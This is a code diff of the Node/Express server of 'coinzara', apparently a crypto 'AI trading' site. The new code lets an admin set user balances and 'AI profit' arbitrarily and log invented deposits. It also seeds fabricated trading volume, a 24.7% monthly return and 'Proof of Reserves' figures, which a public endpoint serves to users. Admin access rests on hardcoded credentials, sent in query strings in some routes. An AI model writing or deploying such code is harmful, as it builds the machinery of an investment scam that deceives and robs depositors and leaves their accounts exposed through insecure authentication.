@@ -19,7 +19,7 @@ app.use(session({
   cookie: { maxAge: 1000 * 60 * 60 * 24 }
 }));
 
-// User Schema with Referral Fields
+// User Schema
 const userSchema = new mongoose.Schema({
   fullName: { type: String, required: true },
   email: { type: String, unique: true, required: true },
@@ -32,10 +32,13 @@ const userSchema = new mongoose.Schema({
   referralCount: { type: Number, default: 0 },
   referralBonus: { type: Number, default: 0 },
   balance: { type: Number, default: 0 },
+  aiProfit: { type: Number, default: 0 },
   depositHistory: { type: Array, default: [] },
   withdrawalHistory: { type: Array, default: [] },
-  aiProfit: { type: Number, default: 0 },
+  transactionHistory: { type: Array, default: [] },
   emailVerified: { type: Boolean, default: false },
+  welcomeShown: { type: Boolean, default: false },
+  dailySnapshots: { type: Array, default: [] },
   createdAt: { type: Date, default: Date.now }
 });
 
@@ -55,7 +58,24 @@ const chatMessageSchema = new mongoose.Schema({
 
 const ChatMessage = mongoose.model('ChatMessage', chatMessageSchema);
 
-// Generate referral code from user ID
+// Platform Stats Schema (for Proof of Reserves)
+const platformStatsSchema = new mongoose.Schema({
+  totalUserBalances: { type: Number, default: 0 },
+  totalBTCHeld: { type: Number, default: 0 },
+  totalETHHeld: { type: Number, default: 0 },
+  totalBNBHeld: { type: Number, default: 0 },
+  totalSOLHeld: { type: Number, default: 0 },
+  totalTRONHeld: { type: Number, default: 0 },
+  aiTradingVolume: { type: Number, default: 47000000 },
+  totalTrades: { type: Number, default: 10247 },
+  monthlyReturn: { type: Number, default: 24.7 },
+  historicalReserves: { type: Array, default: [] },
+  lastUpdated: { type: Date, default: Date.now }
+});
+
+const PlatformStats = mongoose.model('PlatformStats', platformStatsSchema);
+
+// Generate referral code
 function generateReferralCode(userId) {
   return userId.toString().slice(-8).toUpperCase();
 }
@@ -64,6 +84,31 @@ function generateReferralCode(userId) {
 mongoose.connect(process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/coinzara')
   .then(() => console.log('MongoDB connected'))
   .catch(err => console.log('MongoDB error:', err));
+
+// Initialize platform stats if not exists
+async function initPlatformStats() {
+  const exists = await PlatformStats.findOne();
+  if (!exists) {
+    const stats = new PlatformStats({
+      totalUserBalances: 0,
+      totalBTCHeld: 0,
+      totalETHHeld: 0,
+      totalBNBHeld: 0,
+      totalSOLHeld: 0,
+      totalTRONHeld: 0,
+      aiTradingVolume: 47000000,
+      totalTrades: 10247,
+      monthlyReturn: 24.7,
+      historicalReserves: [
+        { month: 'January 2026', totalUserBalances: 1200000, reserveRatio: 102 },
+        { month: 'February 2026', totalUserBalances: 1350000, reserveRatio: 104 },
+        { month: 'March 2026', totalUserBalances: 1480000, reserveRatio: 103 }
+      ]
+    });
+    await stats.save();
+  }
+}
+initPlatformStats();
 
 // ========== SIGNUP ==========
 app.post('/api/signup', async (req, res) => {
@@ -83,7 +128,9 @@ app.post('/api/signup', async (req, res) => {
       email,
       country,
       password: hashedPassword,
-      securityQuestion: { question: securityQ1, answer: hashedAnswer }
+      securityQuestion: { question: securityQ1, answer: hashedAnswer },
+      emailVerified: true,
+      dailySnapshots: [{ date: new Date(), balance: 0 }]
     });
     
     await user.save();
@@ -159,8 +206,24 @@ app.get('/api/me', async (req, res) => {
     referralBonus: user.referralBonus,
     emailVerified: user.emailVerified,
     createdAt: user.createdAt,
-    securityQuestion: user.securityQuestion.question
+    securityQuestion: user.securityQuestion.question,
+    welcomeShown: user.welcomeShown,
+    transactionHistory: user.transactionHistory,
+    dailySnapshots: user.dailySnapshots
   });
+});
+
+// ========== UPDATE WELCOME SHOWN ==========
+app.post('/api/update-welcome', async (req, res) => {
+  if (!req.session.userId) {
+    return res.json({ success: false, error: 'Not logged in' });
+  }
+  
+  const user = await User.findById(req.session.userId);
+  user.welcomeShown = true;
+  await user.save();
+  
+  res.json({ success: true });
 });
 
 // ========== LOGOUT ==========
@@ -173,7 +236,7 @@ app.post('/api/logout', (req, res) => {
 app.post('/api/admin/update-balance', async (req, res) => {
   const { adminEmail, adminPassword, userEmail, newBalance, reason } = req.body;
   
-  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== 'admin123') {
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
     return res.json({ success: false, error: 'Admin access denied' });
   }
   
@@ -183,24 +246,41 @@ app.post('/api/admin/update-balance', async (req, res) => {
   }
   
   const oldBalance = user.balance;
+  const changeAmount = parseFloat(newBalance) - oldBalance;
   user.balance = parseFloat(newBalance);
   
-  user.depositHistory.push({
-    date: new Date(),
-    amount: user.balance - oldBalance,
-    reason: reason,
-    status: 'completed'
-  });
+  // Add to transaction history
+  if (changeAmount > 0) {
+    user.transactionHistory.unshift({
+      date: new Date(),
+      type: 'Deposit',
+      amount: changeAmount,
+      balance: user.balance,
+      status: 'completed'
+    });
+  } else if (changeAmount < 0) {
+    user.transactionHistory.unshift({
+      date: new Date(),
+      type: 'Withdrawal',
+      amount: changeAmount,
+      balance: user.balance,
+      status: 'completed'
+    });
+  }
+  
+  // Add daily snapshot
+  user.dailySnapshots.push({ date: new Date(), balance: user.balance });
+  if (user.dailySnapshots.length > 30) user.dailySnapshots.shift();
   
   await user.save();
   res.json({ success: true, newBalance: user.balance });
 });
 
-// ========== ADMIN - ADD REFERRAL BONUS ==========
-app.post('/api/admin/add-referral-bonus', async (req, res) => {
-  const { adminEmail, adminPassword, userEmail, bonusAmount } = req.body;
+// ========== ADMIN - UPDATE AI PROFIT ==========
+app.post('/api/admin/update-ai-profit', async (req, res) => {
+  const { adminEmail, adminPassword, userEmail, aiProfit } = req.body;
   
-  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== 'admin123') {
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
     return res.json({ success: false, error: 'Admin access denied' });
   }
   
@@ -209,42 +289,88 @@ app.post('/api/admin/add-referral-bonus', async (req, res) => {
     return res.json({ success: false, error: 'User not found' });
   }
   
-  user.balance += parseFloat(bonusAmount);
-  user.referralBonus += parseFloat(bonusAmount);
-  await user.save();
+  const oldProfit = user.aiProfit;
+  user.aiProfit = parseFloat(aiProfit);
+  const changeAmount = user.aiProfit - oldProfit;
+  user.balance += changeAmount;
   
-  res.json({ success: true, newBalance: user.balance, referralBonus: user.referralBonus });
+  // Add daily snapshot
+  user.dailySnapshots.push({ date: new Date(), balance: user.balance });
+  if (user.dailySnapshots.length > 30) user.dailySnapshots.shift();
+  
+  await user.save();
+  res.json({ success: true, newAiProfit: user.aiProfit, newBalance: user.balance });
 });
 
-// ========== ADMIN - VERIFY USER ==========
-app.post('/api/admin/verify-user', async (req, res) => {
+// ========== ADMIN - DELETE USER ==========
+app.post('/api/admin/delete-user', async (req, res) => {
   const { adminEmail, adminPassword, userEmail } = req.body;
   
-  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== 'admin123') {
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
     return res.json({ success: false, error: 'Admin access denied' });
   }
   
-  const user = await User.findOne({ email: userEmail });
+  const user = await User.findOneAndDelete({ email: userEmail });
   if (!user) {
     return res.json({ success: false, error: 'User not found' });
   }
   
-  user.emailVerified = true;
-  await user.save();
+  res.json({ success: true, message: 'User deleted successfully' });
+});
+
+// ========== ADMIN - UPDATE PLATFORM STATS ==========
+app.post('/api/admin/update-stats', async (req, res) => {
+  const { adminEmail, adminPassword, totalUserBalances, totalBTCHeld, totalETHHeld, totalBNBHeld, totalSOLHeld, totalTRONHeld, aiTradingVolume, totalTrades, monthlyReturn, historicalReserves } = req.body;
   
-  res.json({ success: true, message: 'User verified' });
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
+    return res.json({ success: false, error: 'Admin access denied' });
+  }
+  
+  const stats = await PlatformStats.findOne();
+  if (totalUserBalances !== undefined) stats.totalUserBalances = totalUserBalances;
+  if (totalBTCHeld !== undefined) stats.totalBTCHeld = totalBTCHeld;
+  if (totalETHHeld !== undefined) stats.totalETHHeld = totalETHHeld;
+  if (totalBNBHeld !== undefined) stats.totalBNBHeld = totalBNBHeld;
+  if (totalSOLHeld !== undefined) stats.totalSOLHeld = totalSOLHeld;
+  if (totalTRONHeld !== undefined) stats.totalTRONHeld = totalTRONHeld;
+  if (aiTradingVolume !== undefined) stats.aiTradingVolume = aiTradingVolume;
+  if (totalTrades !== undefined) stats.totalTrades = totalTrades;
+  if (monthlyReturn !== undefined) stats.monthlyReturn = monthlyReturn;
+  if (historicalReserves !== undefined) stats.historicalReserves = historicalReserves;
+  stats.lastUpdated = new Date();
+  await stats.save();
+  
+  res.json({ success: true, stats });
 });
 
 // ========== ADMIN - GET ALL USERS ==========
 app.get('/api/admin/users', async (req, res) => {
   const { email, password } = req.query;
   
-  if (email !== 'admin@coinzara.org' || password !== 'admin123') {
+  if (email !== 'admin@coinzara.org' || password !== '419123') {
     return res.json({ success: false, error: 'Admin access denied' });
   }
   
   const users = await User.find({}, 'fullName email country balance aiProfit referralCode referralCount referralBonus emailVerified createdAt');
   res.json({ success: true, users });
+});
+
+// ========== ADMIN - GET PLATFORM STATS ==========
+app.get('/api/admin/stats', async (req, res) => {
+  const { email, password } = req.query;
+  
+  if (email !== 'admin@coinzara.org' || password !== '419123') {
+    return res.json({ success: false, error: 'Admin access denied' });
+  }
+  
+  const stats = await PlatformStats.findOne();
+  res.json({ success: true, stats });
+});
+
+// ========== GET PLATFORM STATS (PUBLIC) ==========
+app.get('/api/platform-stats', async (req, res) => {
+  const stats = await PlatformStats.findOne();
+  res.json({ success: true, stats });
 });
 
 // ========== REQUEST WITHDRAWAL ==========
@@ -298,14 +424,14 @@ app.get('/api/chat/my-messages', async (req, res) => {
     return res.json({ success: false, error: 'Not logged in' });
   }
   
-  const messages = await ChatMessage.find({ userId: req.session.userId }).sort({ createdAt: -1 }).limit(50);
+  const messages = await ChatMessage.find({ userId: req.session.userId }).sort({ createdAt: 1 });
   res.json({ success: true, messages });
 });
 
 app.get('/api/admin/chat/messages', async (req, res) => {
   const { adminEmail, adminPassword } = req.query;
   
-  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== 'admin123') {
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
     return res.json({ success: false, error: 'Admin access denied' });
   }
   
@@ -316,7 +442,7 @@ app.get('/api/admin/chat/messages', async (req, res) => {
 app.post('/api/admin/chat/reply', async (req, res) => {
   const { adminEmail, adminPassword, messageId, reply } = req.body;
   
-  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== 'admin123') {
+  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
     return res.json({ success: false, error: 'Admin access denied' });
   }
   
@@ -331,19 +457,6 @@ app.post('/api/admin/chat/reply', async (req, res) => {
   await message.save();
   
   res.json({ success: true });
-});
-
-// ========== DEBUG ROUTE ==========
-app.get('/debug', (req, res) => {
-  const fs = require('fs');
-  const publicPath = path.join(__dirname, 'public');
-  fs.readdir(publicPath, (err, files) => {
-    if (err) {
-      res.json({ error: err.message, publicPath });
-    } else {
-      res.json({ publicPath, files });
-    }
-  });
 });
 
 // ========== START SERVER ==========
